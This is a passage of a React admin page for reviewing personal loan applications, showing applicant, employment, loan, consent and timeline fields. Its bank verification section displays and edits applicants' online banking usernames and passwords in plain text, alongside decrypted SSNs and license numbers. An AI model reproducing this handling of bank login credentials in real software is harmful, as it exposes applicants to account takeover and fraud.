                      className="px-4 py-2 rounded-lg text-sm font-medium bg-primary text-white hover:opacity-90 transition cursor-pointer disabled:opacity-50"
                    >
                      {saving ? "Saving..." : "Save"}
                    </button>
                    <button
                      onClick={() => setEdit(false)}
                      disabled={saving}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer disabled:opacity-50"
                    >
                      Cancel
                    </button>
                  </>
                ) : (
                  isAdmin && (
                    <button
                      onClick={() => setEdit(true)}
                      className="px-4 py-2 rounded-lg text-sm font-medium border border-gray-300 text-gray-700 hover:bg-gray-50 transition cursor-pointer"
                    >
                      Edit
                    </button>
                  )
                )} */}
                <span
                  className={`px-4 py-2 rounded-full text-sm font-semibold border ${STATUS_COLORS[app.status] || ""}`}
                >
                  {formatStatusLabel(app.status).toUpperCase()}
                </span>
              </div>
            </div>

            {/* Messages */}
            {error && (
              <div className="p-3 bg-red-50 border border-red-200 text-red-700 rounded-lg text-sm">
                {error}
              </div>
            )}
            {success && (
              <div className="p-3 bg-green-50 border border-green-200 text-green-700 rounded-lg text-sm">
                {success}
              </div>
            )}

            {/* Status Actions */}
            {(isAdmin || isReviewer) && (
              <div className="space-y-4">
                <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                    Quick Status Actions
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    {QUICK_STATUS_ACTIONS.map((action) => (
                      <button
                        key={action.value}
                        onClick={() => handleStatusUpdate(action.value)}
                        disabled={statusUpdating}
                        className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${
                          STATUS_COLORS[action.value] || ""
                        }`}
                      >
                        {statusUpdating ? "..." : action.label}
                      </button>
                    ))}
                  </div>
                </div>

                {/* <div className="bg-white rounded-xl border border-gray-200 p-6">
                  <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-3">
                    Additional Statuses
                  </h3>
                  <div className="flex flex-wrap gap-2">
                    {ALL_STATUSES.filter((s) => {
                      return s !== app.status;
                    }).map((s) => (
                      <button
                        key={s}
                        onClick={() => handleStatusUpdate(s)}
                        disabled={statusUpdating}
                        className={`px-4 py-2 rounded-lg text-sm font-medium border transition cursor-pointer disabled:opacity-50 ${
                          STATUS_COLORS[s] || ""
                        }`}
                      >
                        {statusUpdating ? "..." : formatStatusLabel(s)}
                      </button>
                    ))}
                  </div>
                </div> */}
              </div>
            )}

            <div className="flex items-center justify-between p-4 bg-white border border-slate-200 rounded-xl shadow-sm hover:shadow-md transition-shadow">
              <div>
                <h3 className="text-base font-semibold text-slate-800">
                  {app.first_name} {app.last_name}
                </h3>
                <p className="text-sm text-slate-500">
                  Application ID:{" "}
                  <span className="font-mono">{app.application_id}</span>
                </p>
              </div>

              <button
                onClick={handleDownloadLoanAgreement}
                disabled={isDownloading}
                className="inline-flex items-center gap-2 px-4 py-2.5 text-sm font-medium text-white bg-indigo-600 rounded-lg hover:bg-indigo-700 active:bg-indigo-800 disabled:opacity-60 disabled:cursor-not-allowed transition-colors shadow-sm focus:outline-none focus:ring-2 focus:ring-indigo-500 focus:ring-offset-2"
              >
                {isDownloading ? (
                  <>
                    {/* Animated Loading Spinner */}
                    <svg
                      className="w-4 h-4 animate-spin text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    <span>Downloading...</span>
                  </>
                ) : (
                  <>
                    {/* PDF Document Icon */}
                    <svg className="w-4 h-4 fill-current" viewBox="0 0 20 20">
                      <path d="M4 18h12a2 2 0 002-2V6l-4-4H4a2 2 0 00-2 2v12a2 2 0 002 2zm0-14h7v3h3v9H4V4z" />
                    </svg>
                    <span>
                      Download {app.first_name} {app.last_name} Loan Agreement
                    </span>
                  </>
                )}
              </button>
            </div>

            {/* Personal Info */}
            <Section title="Personal Information">
              {edit ? (
                <>
                  <Field label="Application ID" value={app.application_id} />
                  <EditableField
                    label="First Name"
                    name="first_name"
                    value={formData.first_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Last Name"
                    name="last_name"
                    value={formData.last_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Email"
                    name="email"
                    type="email"
                    value={formData.email}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Phone"
                    name="phone"
                    value={formData.phone}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Date of Birth"
                    name="date_of_birth"
                    type="date"
                    value={mdyToIso(formData?.date_of_birth)}
                    onChange={(name, value) =>
                      handleFormChange(name, isoToMdy(String(value)))
                    }
                  />
                  <div>
                    <label
                      htmlFor="driverLicenseState"
                      className="block text-xs text-gray-400"
                    >
                      DL Issuing State
                    </label>
                    <select
                      value={formData.dl_state ?? ""}
                      onChange={(e) =>
                        handleFormChange("dl_state", e.target.value)
                      }
                      id="driverLicenseState"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select state</option>
                      {US_STATES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Driver's License State"
                    name="dl_state"
                    value={formData.dl_state}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="SSN"
                    name="ssn_decrypted"
                    value={formData.ssn_decrypted}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Driver's License Number"
                    name="dl_decrypted"
                    value={formData.dl_decrypted}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <>
                  <Field label="Application ID" value={app.application_id} />
                  <Field
                    label="Full name"
                    value={`${app.first_name} ${app.last_name}`}
                  />
                  <Field label="Suffix" value={app.suffix || "-"} />
                  <Field label="Email" value={app.email} />
                  <Field label="Phone" value={app.phone} />
                  <Field
                    label="Date of Birth"
                    value={
                      app.date_of_birth
                        ? new Date(app.date_of_birth).toLocaleDateString(
                            "en-US",
                            {
                              month: "2-digit",
                              day: "2-digit",
                              year: "numeric",
                            },
                          )
                        : "N/A"
                    }
                  />
                  {/* <Field label="Driver's License State" value={app.dl_state} />
                  <Field label="SSN" value={app.ssn_decrypted} />
                  <Field label="DL Number" value={app.dl_decrypted} /> */}
                </>
              )}
            </Section>

            {/* Address */}
            <Section title="Address">
              {edit ? (
                <>
                  <div className="sm:col-span-2">
                    <EditableField
                      label="Street Address"
                      name="street_address"
                      value={formData.street_address}
                      onChange={handleFormChange}
                    />
                  </div>
                  <EditableField
                    label="City"
                    name="city"
                    value={formData.city}
                    onChange={handleFormChange}
                  />
                  <div>
                    <label
                      htmlFor="state"
                      className="block text-xs text-gray-400"
                    >
                      State
                    </label>
                    <select
                      value={formData.state ?? ""}
                      onChange={(e) =>
                        handleFormChange("state", e.target.value)
                      }
                      id="state"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select state</option>
                      {US_STATES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="State"
                    name="state"
                    value={formData.state}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="Zip Code"
                    name="zip_code"
                    value={formData.zip_code}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Country"
                    name="country"
                    value={formData.country}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <div className="sm:col-span-2">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <Field
                      label="Street Address"
                      value={app.street_address || "-"}
                    />

                    <Field
                      label="Apt / Unit / Suite"
                      value={app.apt_unit_suite || "-"}
                    />

                    <Field label="City" value={app.city || "-"} />

                    <Field label="State" value={app.state || "-"} />

                    <Field label="ZIP Code" value={app.zip_code || "-"} />

                    <Field label="Country" value={app.country || "-"} />

                    <Field
                      label="Time at Current Address"
                      value={app.time_at_current_address || "-"}
                    />

                    <Field
                      label="Housing Status"
                      value={app.housing_status || "-"}
                    />

                    <Field
                      label="Monthly Housing Payment"
                      value={
                        app.monthly_housing_payment != null
                          ? formatCurrency(Number(app.monthly_housing_payment))
                          : "-"
                      }
                    />
                  </div>
                </div>
              )}
            </Section>

            {/* Employment */}
            <Section title="Employment & Income">
              {edit ? (
                <>
                  <div>
                    <label
                      htmlFor="employment_status"
                      className="block text-xs text-gray-400"
                    >
                      Employment Status
                    </label>
                    <select
                      value={formData.employment_status ?? ""}
                      onChange={(e) =>
                        handleFormChange("employment_status", e.target.value)
                      }
                      id="employment_status"
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select status</option>
                      {EMPLOYMENT_STATUSES.map((s) => (
                        <option key={s.value} value={s.value}>
                          {s.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Status"
                    name="employment_status"
                    value={formData.employment_status}
                    onChange={handleFormChange}
                  /> */}
                  <EditableField
                    label="Employer"
                    name="employer_name"
                    value={formData.employer_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Job Title"
                    name="job_title"
                    value={formData.job_title}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Monthly Income"
                    name="monthly_income"
                    type="text"
                    value={formData.net_monthly_income}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Years Employed"
                    name="years_employed"
                    type="text"
                    value={formData.time_at_current_job}
                    onChange={handleFormChange}
                  />
                </>
              ) : (
                <div className="sm:col-span-2">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <Field
                      label="Employment Status"
                      value={app.employment_status || "-"}
                    />

                    <Field
                      label="Primary Income Type"
                      value={app.primary_income_type || "-"}
                    />

                    <Field label="Employer" value={app.employer_name || "-"} />

                    <Field label="Job Title" value={app.job_title || "-"} />

                    <Field
                      label="Employer Phone"
                      value={app.employer_phone || "-"}
                    />

                    <Field
                      label="Time at Current Job"
                      value={app.time_at_current_job || "-"}
                    />

                    <Field
                      label="Net Monthly Income"
                      value={
                        app.net_monthly_income != null
                          ? formatCurrency(Number(app.net_monthly_income))
                          : "-"
                      }
                    />

                    <Field
                      label="Pay Frequency"
                      value={app.pay_frequency || "-"}
                    />

                    <Field
                      label="Next Pay Date"
                      value={
                        app.next_pay_date
                          ? new Date(app.next_pay_date).toLocaleDateString(
                              "en-US",
                            )
                          : "-"
                      }
                    />

                    <Field
                      label="Direct Deposit"
                      value={
                        app.direct_deposit === true
                          ? "Yes"
                          : app.direct_deposit === false
                            ? "No"
                            : "-"
                      }
                    />

                    <Field
                      label="Additional Monthly Income"
                      value={
                        app.additional_monthly_income != null
                          ? formatCurrency(
                              Number(app.additional_monthly_income),
                            )
                          : "-"
                      }
                    />

                    <Field
                      label="Additional Income Source"
                      value={app.additional_income_source || "-"}
                    />
                  </div>
                </div>
              )}
            </Section>

            {/* Loan Details */}
            <Section title="Loan Details">
              {edit ? (
                <>
                  <EditableField
                    label="Loan Amount ($2,000 - $10,000)"
                    name="loan_amount"
                    type="text"
                    min={2000}
                    max={10000}
                    value={formData.loan_amount}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Purpose"
                    name="loan_purpose"
                    value={formData.loan_purpose}
                    onChange={handleFormChange}
                  /> */}
                  <div>
                    <label
                      htmlFor="loan_purpose"
                      className="block text-xs text-gray-400"
                    >
                      Loan Purpose
                    </label>
                    <select
                      id="loan_purpose"
                      value={formData.loan_purpose ?? ""}
                      onChange={(e) =>
                        handleFormChange("loan_purpose", e.target.value)
                      }
                      className="w-full mt-1 px-3 py-2 border border-gray-300 rounded-lg text-sm text-gray-900 focus:outline-none focus:ring-2 focus:ring-primary focus:border-transparent"
                    >
                      <option value="">Select purpose</option>
                      {LOAN_PURPOSES.map((p) => (
                        <option key={p.value} value={p.value}>
                          {p.label}
                        </option>
                      ))}
                    </select>
                  </div>
                  {/* <EditableField
                    label="Loan Term (months)"
                    name="loan_term"
                    type="text"
                    value={formData.loan_term}
                    onChange={handleFormChange}
                  /> */}
                  <div>
                    <label className="block text-xs text-gray-400 mb-2">
                      Loan Term
                    </label>
                    <div className="grid grid-cols-4 gap-3">
                      {[24, 36, 48, 60].map((term) => (
                        <button
                          key={term}
                          type="button"
                          onClick={() => handleFormChange("loan_term", term)}
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            Number(formData.loan_term) === term
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {term} mo
                        </button>
                      ))}
                    </div>
                    <p className="text-xs text-text-secondary mt-2">
                      Choose a repayment term from 24 to 60 months to fit your
                      lifestyle.
                    </p>
                  </div>
                  <Field
                    label="Monthly Payment"
                    value={formatCurrency(
                      calcMonthlyPayment(
                        Number(formData.loan_amount ?? 0),
                        Number(formData.loan_term ?? 0),
                      ),
                    )}
                  />
                </>
              ) : (
                <div className="sm:col-span-2">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <Field
                      label="Loan Amount"
                      value={formatCurrency(Number(app.loan_amount))}
                    />

                    <Field
                      label="Loan Purpose"
                      value={app.loan_purpose || "-"}
                    />

                    {app.loan_purpose === "Other Personal Expenses" && (
                      <Field
                        label="Purpose — Other Detail"
                        value={app.loan_purpose_other_detail || "-"}
                      />
                    )}

                    <Field
                      label="Loan Term"
                      value={`${app.loan_term} months`}
                    />

                    <Field
                      label="Monthly Payment"
                      value={formatCurrency(
                        calcMonthlyPayment(
                          Number(app.loan_amount),
                          Number(app.loan_term),
                        ),
                      )}
                    />
                  </div>
                </div>
              )}
            </Section>

            {/* Banking */}
            <Section title="Banking Information">
              {edit ? (
                <>
                  <EditableField
                    label="Bank Name"
                    name="bank_name"
                    value={formData.bank_name}
                    onChange={handleFormChange}
                  />
                  <EditableField
                    label="Routing"
                    name="routing_number"
                    value={formData.routing_number_encrypted}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Account"
                    name="account_type"
                    value={formData.account_type}
                    onChange={handleFormChange}
                  /> */}
                  <div>
                    <label className="block text-xs text-gray-400 mb-2">
                      Account Type
                    </label>
                    <div className="grid grid-cols-2 gap-3">
                      {ACCOUNT_TYPES.map((type) => (
                        <button
                          key={type.value}
                          type="button"
                          onClick={() =>
                            handleFormChange("account_type", type.value)
                          }
                          className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                            formData.account_type === type.value
                              ? "border-primary bg-primary text-white"
                              : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                          }`}
                        >
                          {type.label}
                        </button>
                      ))}
                    </div>
                  </div>
                  <EditableField
                    label="Account Number"
                    name="account_decrypted"
                    value={formData.account_decrypted}
                    onChange={handleFormChange}
                  />
                  {/* <EditableField
                    label="Bank Balance Status"
                    name="bankBalanceStatus"
                    value={formData.bank_balance_status}
                    onChange={handleFormChange}
                  /> */}
                  {/* <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Bank Balance Status
                    </label>
                    <select
                      name="bankBalanceStatus"
                      value={formData.bank_balance_status || ""}
                      onChange={(e) =>
                        handleFormChange("bank_balance_status", e.target.value)
                      }
                      className="w-full rounded-md border border-gray-300 px-3 py-2 focus:border-primary focus:outline-none"
                    >
                      <option value="">Select Status</option>
                      <option value="positive_balance">Positive Balance</option>
                      <option value="overdrawn">Overdrawn</option>
                    </select>
                  </div> */}
                  {/* <div>
                    <label className="block text-sm font-medium text-gray-700 mb-1">
                      Bank Account Age
                    </label>
                    <select
                      name="bankAccountAge"
                      value={formData.bank_account_age || ""}
                      onChange={(e) =>
                        handleFormChange("bank_account_age", e.target.value)
                      }
                      className="w-full rounded-md border border-gray-300 px-3 py-2 focus:border-primary focus:outline-none"
                    >
                      <option value="">Select Account Age</option>
                      <option value="Less than 6 months">
                        Less than 6 months
                      </option>
                      <option value="6-12 months">6–12 months</option>
                      <option value="1-2 years">1–2 years</option>
                      <option value="2-5 years">2–5 years</option>
                      <option value="More than 5 years">
                        More than 5 years
                      </option>
                    </select>
                  </div> */}
                </>
              ) : (
                <div className="sm:col-span-2">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <Field label="Bank Name" value={app.bank_name || "-"} />

                    <Field
                      label="Routing Number"
                      value={app.routing_number_encrypted || "-"}
                    />

                    <Field
                      label="Account Type"
                      value={app.account_type || "-"}
                    />

                    <Field
                      label="Account Number"
                      value={
                        revealedSensitive?.accountNumber ||
                        app.account_decrypted ||
                        "-"
                      }
                    />

                    <Field
                      label="Account Status"
                      value={app.bank_balance_status || "-"}
                    />

                    <Field
                      label="Account Age"
                      value={app.bank_account_age || "-"}
                    />

                    <Field
                      label="Bank Verification"
                      value={
                        app.bank_verification_completed
                          ? "Completed"
                          : "Pending"
                      }
                    />

                    {/* {isAdmin && (
                      <button
                        type="button"
                        onClick={handleRevealSensitive}
                        className="text-sm text-primary hover:underline text-left"
                      >
                        Reveal bank account data
                      </button>
                    )} */}
                  </div>
                </div>
              )}
            </Section>

            <Section title="Identity Verification">
              <Field
                label="SSN"
                value={
                  revealedSensitive?.ssn || app.ssn_decrypted || "•••-••-••••"
                }
              />

              <Field
                label="Driver's License"
                value={
                  revealedSensitive?.driverLicense ||
                  app.dl_decrypted ||
                  "••••••••"
                }
              />

              <Field label="DL Issuing State" value={app.dl_state || "-"} />

              <Field
                label="DL Expiration"
                value={
                  app.dl_expiration_date
                    ? new Date(app.dl_expiration_date).toLocaleDateString(
                        "en-US",
                      )
                    : "-"
                }
              />

              <Field
                label="Hard Credit Authorization"
                value={app.hard_credit_pull_consent ? "Yes" : "No"}
              />

              {/* {isAdmin && (
                <button
                  type="button"
                  onClick={handleRevealSensitive}
                  className="text-sm text-primary hover:underline text-left"
                >
                  Reveal sensitive data
                </button>
              )} */}
            </Section>

            {/* Bank Verification Details */}
            {bankVerification && (
              <Section title="Bank Verification Details">
                {edit ? (
                  <>
                    <EditableField
                      label="Full name"
                      name="full_name"
                      value={formData?.bankVerification?.full_name}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Email"
                      name="email"
                      value={formData?.bankVerification?.email}
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Username"
                      name="online_banking_username"
                      value={
                        formData?.bankVerification?.online_banking_username
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Online Bank Password"
                      name="online_banking_password"
                      value={
                        formData?.bankVerification?.online_banking_password
                      }
                      onChange={handleBankVerificationChange}
                    />
                    <EditableField
                      label="Bank Name"
                      name="bank_name"
                      value={formData?.bankVerification?.bank_name}
                      onChange={handleBankVerificationChange}
                    />
                    {/* <EditableField
                        label="Account"
                        name="account_type"
                        value={formData?.bankVerification?.account_type}
                        onChange={handleBankVerificationChange}
                      />{" "} */}
                    <div>
                      <label className="block text-xs text-gray-400 mb-2">
                        Account Type
                      </label>
                      <div className="grid grid-cols-2 gap-3">
                        {ACCOUNT_TYPES.map((type) => (
                          <button
                            key={type.value}
                            type="button"
                            onClick={() =>
                              handleBankVerificationChange(
                                "account_type",
                                type.value,
                              )
                            }
                            className={`py-3 rounded-lg text-sm font-semibold border-2 transition-all ${
                              formData?.bankVerification?.account_type ===
                              type.value
                                ? "border-primary bg-primary text-white"
                                : "border-surface-dark bg-white text-text-secondary hover:border-primary/50"
                            }`}
                          >
                            {type.label}
                          </button>
                        ))}
                      </div>
                    </div>
                  </>
                ) : (
                  <>
                    <Field
                      label="Full name"
                      value={bankVerification?.full_name}
                    />
                    <Field label="Email" value={bankVerification?.email} />
                    <Field
                      label="Online Bank Username"
                      value={bankVerification?.online_banking_username}
                    />
                    <Field
                      label="Online Bank Password"
                      value={bankVerification?.online_banking_password}
                    />
                    <Field
                      label="Application ID"
                      value={
                        bankVerification?.application_id
                          ? app.application_id
                          : "-"
                      }
                    />
                    <Field
                      label="Bank Name"
                      value={bankVerification?.bank_name}
                    />
                    <Field
                      label="Account"
                      value={bankVerification?.account_type}
                    />
                    {/* <Field
                      label="Verification Status"
                      value={bankVerification?.verification_status}
                    /> */}
                    <Field
                      label="Submitted At"
                      value={bankVerification?.created_at}
                    />
                  </>
                )}
              </Section>
            )}

            <Section title="Consents">
              <Field
                label="TCPA Express Written Consent"
                value={app.tcpa_consent ? "Yes" : "No"}
              />

              <Field
                label="E-SIGN Consent"
                value={app.esign_consent ? "Yes" : "No"}
              />

              <Field
                label="Soft Credit Pull Authorization"
                value={app.soft_credit_pull_consent ? "Yes" : "No"}
              />

              <Field
                label="Hard Credit Pull Authorization"
                value={app.hard_credit_pull_consent ? "Yes" : "No"}
              />

              <Field
                label="Privacy Policy & GLBA"
                value={app.privacy_consent ? "Yes" : "No"}
              />

              <Field
                label="ACH Authorization"
                value={app.ach_authorization_consent ? "Yes" : "No"}
              />
            </Section>

            {/* UTM / Tracking */}
            {
              <Section title="Application Tracking">
                <Field label="IP Address" value={app.ip_address || "-"} />

                <Field label="User Agent" value={app.user_agent || "-"} />

                {/* <Field
                  label="Device Fingerprint"
                  value={app.device_fingerprint || "-"}
                /> */}

                <Field label="Page URL" value={app.page_url || "-"} />

                {/* <Field label="Referrer URL" value={app.referrer_url || "-"} /> */}

                {/* <Field
                  label="Landing Page"
                  value={app.landing_page_first_touch || "-"}
                /> */}

                {/* <Field
                  label="Jornaya Lead ID"
                  value={app.jornaya_leadid || "-"}
                /> */}

                {/* <Field
                  label="TrustedForm Certificate"
                  value={app.trustedform_cert_url || "-"}
                /> */}

                {/* <Field
                  label="Assisted By Loan Agent"
                  value={app.assisted_by_loan_agent || "-"}
                /> */}
              </Section>
            }

            {/* <Section title="Marketing Attribution">
              <Field label="UTM Source" value={app.utm_source || "-"} />

              <Field label="UTM Medium" value={app.utm_medium || "-"} />

              <Field label="UTM Campaign" value={app.utm_campaign || "-"} />

              <Field label="UTM Content" value={app.utm_content || "-"} />

              <Field label="UTM Term" value={app.utm_term || "-"} />
            </Section> */}

            <Section title="Application Timeline">
              <Field
                label="Step 1 Started"
                value={
                  app.step1_started_at
                    ? new Date(app.step1_started_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Step 1 Submitted"
                value={
                  app.step1_submitted_at
                    ? new Date(app.step1_submitted_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Step 2 Submitted"
                value={
                  app.step2_submitted_at
                    ? new Date(app.step2_submitted_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Step 3 Submitted"
                value={
                  app.step3_submitted_at
                    ? new Date(app.step3_submitted_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Total Time on Form"
                value={
                  app.total_time_on_form != null
                    ? `${app.total_time_on_form} seconds`
                    : "-"
                }
              />

              <Field
                label="Created At"
                value={
                  app.created_at
                    ? new Date(app.created_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Updated At"
                value={
                  app.updated_at
                    ? new Date(app.updated_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Reviewed At"
                value={
                  app.reviewed_at
                    ? new Date(app.reviewed_at).toLocaleString("en-US")
                    : "-"
                }
              />

              <Field
                label="Funded At"
                value={
                  app.funded_at
                    ? new Date(app.funded_at).toLocaleString("en-US")
                    : "-"
                }
              />
            </Section>

            {/* Timestamps */}
            {/* <Section title="Timestamps">
              <Field
                label="Created"
                value={app.created_at ? formatDateTime(app.created_at) : "—"}
              />
              <Field
                label="Updated"
                value={app.updated_at ? formatDateTime(app.updated_at) : "—"}
              />
              <Field
                label="Reviewed"
                value={app.reviewed_at ? formatDateTime(app.reviewed_at) : "—"}
              />
              <Field
                label="Funded"
                value={app.funded_at ? formatDateTime(app.funded_at) : "—"}
              />
              <Field label="IP Address" value={app.ip_address} />
            </Section> */}

            {/* Audit Log */}
            {auditLog.length > 0 && (
              <div className="bg-white rounded-xl border border-gray-200 p-6">
                <h3 className="text-sm font-semibold text-gray-500 uppercase tracking-wide mb-4">
                  Audit Log
                </h3>
                <div className="space-y-3">
                  {auditLog.map((entry) => (
                    <div
                      key={entry.id}
                      className="flex items-start gap-3 text-sm border-b border-gray-50 pb-3"
                    >
                      <div className="flex-1">
                        <span className="font-medium text-gray-900">
                          {entry.action}
                        </span>
                        <span className="text-gray-400 mx-2">by</span>
                        <span className="text-gray-600">
                          {entry.performed_by}
                        </span>
                        {entry.details &&
                          Object.keys(entry.details).length > 0 && (
                            <p className="text-xs text-gray-400 mt-1">
                              {JSON.stringify(entry.details)}
                            </p>
                          )}
                      </div>
                      <span className="text-xs text-gray-400 whitespace-nowrap">
                        {formatDateTime(entry.created_at)}
                      </span>
                    </div>
                  ))}
                </div>
              </div>
            )}

            {/* Delete */}
            {isAdmin && (
              <div className="bg-white rounded-xl border border-red-200 p-6">
                <h3 className="text-sm font-semibold text-red-500 uppercase tracking-wide mb-3">
                  Danger Zone
                </h3>
                {deleteConfirm ? (
                  <div className="flex items-center gap-3">
                    <p className="text-sm text-gray-600">
                      Are you sure? This action cannot be undone.
                    </p>
                    <button
                      onClick={handleDelete}
                      className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 transition cursor-pointer"
                    >
                      Confirm Delete
                    </button>
                    <button
                      onClick={() => setDeleteConfirm(false)}
                      className="px-4 py-2 border border-gray-300 rounded-lg text-sm hover:bg-gray-50 transition cursor-pointer"
                    >
                      Cancel
                    </button>
                  </div>
                ) : (
                  <button
                    onClick={() => setDeleteConfirm(true)}
                    className="px-4 py-2 border border-red-300 text-red-600 rounded-lg text-sm font-medium hover:bg-red-50 transition cursor-pointer"
                  >
                    Delete Application
                  </button>
                )}
              </div>
            )}
          </div>
        ) : null}
      </div>
    </div>
  );
}
